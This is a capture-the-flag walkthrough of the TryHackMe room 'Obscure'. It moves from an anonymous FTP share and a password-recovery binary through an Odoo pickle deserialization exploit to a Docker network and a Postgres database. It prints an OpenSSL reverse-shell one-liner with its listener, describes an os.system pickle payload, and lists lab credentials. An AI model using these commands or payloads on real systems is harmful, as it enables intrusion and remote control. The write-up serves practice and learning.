# Obscure

[Obscure](https://tryhackme.com/room/obscured)

## Solution

- nmap scan: 21, 22, 80

### Part 1

We see from the nmap scan that we can connect using anonymous session with ftp.
In the fpt session we find a `notice.txt` file and an ELF executable called
`password`. From the notice `password` is an application that stores passwords?

Intresting `strings`:

```
SecurePaH
ssword12H
```

We can `chmox +x password` and try to run it. We get the following message:

```
Password Recovery
Please enter your employee id that is in your email
```

If we try to break  the app with a very long string we get `*** stack smashing
detected ***: terminated` so we might not be able to redirect code execution.
We can try to gdb into the executable and try to see if we can somehow exploit
the tool.

Using gdb we can see that the input is compared using strcmp with `971234596`,
which is one of the strings of the executable, and it seems that it is the user
id. We can try to run the executable with that value.

After runnin the `password` tool with the input `971234596` we get
`SecurePassword123!`. This might be useful later. Maybe there is something else
in the code that we can do.

We can access the website on port 80. After playing around a bit, I tried to go
to `Manage Databases`. There I tried to run backup and provided the password
that we got from the executable. And it downloaded a zip archive.

Scanning trought the `dump.sql` file I found something interesting `1	t
admin@antisoft.thm		1	3	\N	f	1	\N	\N	2022-07-23 10:52:10.087949
<span data-o-mail-quote="1">-- <br data-o-mail-quote="1">\nAdministrator</span>
$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag`

Funny enough, the login `admin@antisoft.thm` and password `SecurePassword123!`
works on the website. (We can try and see if hashcat finds the same password,
but it's not necessary).

I was randomly clicking on the sidebar (Apps, Updates) and got an error
`Uncaught TypeError: Cannot read properties of null (reading '0')`. Not sure if
it is relevant or not. There is also a `Settings` tab. Maybe that is more
interesting.

I searched for odoo on exploitdb and found something that looks promising. This
seems to match with the version that we have and is an actual thing. I spent so
much time on that. But it didn't work first try. I am too deep to not continue
on this rabbit hole. https://www.exploit-db.com/exploits/44064 There is another
button `Activate developer mode`... smh. Idk if that does something. Still no
idea what to do from here.

Well, the database anonymous exploit was actually the way to go. I just needed
to try a different connection method. You need to use pickle and pyhton2.7 for
this to work. Basically do the reverse of what happens on the server. After
many experiments, they do pickle.load (no base64, just raw).

```
user@attack$ ncat --ssl -vv -l -p 4242

user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

So we need to put the victim command as the payload for a pickled file. Create
a class that extends object and in the `__reduce__` method return a tuple
`(os.system, (payload,))`. This will execute the payload on pickle.load.
Full script `./expickle/exploit.py`.

Next go to the home directory and cat the flag file.

### Part 2

It looks like we are logged in as `odoo` and we are inside a docker container.

```
HOSTNAME=b8a9bbf1f380
DB_PORT=tcp://172.17.0.2:5432
SHLVL=0
DB_ENV_PG_MAJOR=9.4
HOME=/var/lib/odoo
OLDPWD=/var
DB_NAME=/unkkuri-odoo/db
DB_PORT_5432_TCP=tcp://172.17.0.2:5432
DB_ENV_PGDATA=/var/lib/postgresql/data
ODOO_RC=/etc/odoo/odoo.conf
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DB_ENV_PG_VERSION=9.4.26-1.pgdg90+1
DB_ENV_LANG=en_US.utf8
ODOO_VERSION=10.0
PWD=/
DB_PORT_5432_TCP_ADDR=172.17.0.2
DB_ENV_POSTGRES_PASSWORD=unkkuri-secret-pw
DB_ENV_GOSU_VERSION=1.11
TZ=UTC
DB_PORT_5432_TCP_PORT=5432
DB_ENV_POSTGRES_USER=odoo
DB_PORT_5432_TCP_PROTO=tcp
```

Another interesting thing is that there is also a `172.17.0.1` host on the
network. We can run the following to check.

```
for i in $(seq 1 254); do (ping -c 1 172.17.0.${i} | grep "64 bytes from" | grep -oE "([0-9]{1,3}[\.]){3}[0-9]{1,3}" &); done;
```

- `172.17.0.1` main server
- `172.17.0.2` the postgresql database
- `172.17.0.3` the odoo thing that we can access

Nice it looks like we have `psql` so we can try to connect to pg. We can try to
connect to the `main` db. Since we saw this name back when we were in the web
odoo stuff. (Big brain, took me a lot of time to remember the name). I guess
the password is obvious, but it is `unkkuri-secret-pw` look above.

```
psql postgresql://172.17.0.2:5432/main
```

I looked into the schemas but I could not find anything useful.
